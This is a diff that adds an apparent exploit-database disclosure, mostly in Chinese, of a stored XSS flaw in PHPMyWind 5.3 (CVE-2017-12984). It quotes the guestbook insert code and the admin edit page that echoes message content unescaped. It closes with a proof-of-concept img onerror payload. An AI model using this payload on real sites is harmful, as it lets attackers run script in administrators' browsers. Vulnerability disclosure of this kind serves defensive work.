@@ -1,0 +1,68 @@
+Exploit Title：PHPMyWind 5.3 has XSS
+Exploit Author:小雨
+Vendor Homepage:http://phpmywind.com
+Software Link:http://phpmywind.com/downloads/PHPMyWind_5.3.zip
+Version:5.3
+CVE:CVE-2017-12984
+
+
+$r= $dosql->GetOne("SELECT Max(orderid) AS orderid FROM `#@__message`");
+                $orderid= (empty($r['orderid']) ? 1 : ($r['orderid'] + 1));
+                $nickname= htmlspecialchars($nickname);//游客(xxx)
+                $contact= htmlspecialchars($contact); //联系方式
+                $content= htmlspecialchars($content); //留言内容
+                
+                $posttime= GetMkTime(time());
+                $ip= gethostbyname($_SERVER['REMOTE_ADDR']);
+        
+        
+                $sql= "INSERT INTO `#@__message` (siteid, nickname, contact, content, orderid, posttime, htop, rtop, checkinfo, ip) VALUES (1, '$nickname', '$contact', '$content', '$orderid', '$posttime', '', '', 'false', '$ip')";
+                if($dosql->ExecNoneQuery($sql))
+                {
+                        ShowMsg('留言成功，感谢您的支持！','message.php');
+                        exit();
+                }
+        }
+可以看出使用htmlspecialchars进行过滤,带入库中.
+跟进content参数。
+127.0.0.1/PHPMyWind_5.3/admin/ message_update.php
+<?php require_once(dirname(__FILE__).'/inc/config.inc.php');IsModelPriv('message'); ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>修改留言</title>
+<link href="templates/style/admin.css" rel="stylesheet" type="text/css" />
+<script type="text/javascript" src="templates/js/jquery.min.js"></script>
+<script type="text/javascript" src="templates/js/checkf.func.js"></script>
+<script type="text/javascript" src="editor/kindeditor-min.js"></script>
+<script type="text/javascript" src="editor/lang/zh_CN.js"></script>
+</head>
+<body>
+<?php
+$row = $dosql->GetOne("SELECT * FROM `#@__message` WHERE `id`=$id");
+?>
+<div class="formHeader"> <span class="title">修改留言</span> <a href="javascript:location.reload();" class="reload">刷新</a> </div>
+<form name="form" id="form" method="post" action="message_save.php">
+        <table width="100%" border="0" cellspacing="0" cellpadding="0" class="formTable">
+                <tr>
+                        <td width="25%" height="40" align="right">用户名：</td>
+                        <td width="75%"><strong><?php echo $row['nickname'] ?></strong></td>
+                </tr>
+                <tr>
+                        <td height="40" align="right">联系方式：</td>
+                        <td><input type="text" name="contact" id="contact" class="input" value="<?php echo $row['contact'] ?>" /></td>
+                </tr>
+                <tr>
+                        <td height="198" align="right">留言内容：</td>
+                        <td><textarea name="content" id="content"><?php echo $row['content'] ?></textarea>
+                                <script>
+
+
+p:33
+<td><textarea name="content" id="content"><?php echo $row['content'] ?></textarea>
+
+后台直接取出content参数,数据并未进行转义操作。
+
+
+EXP: “><img/src=x onerror=alert(2001)><“‘
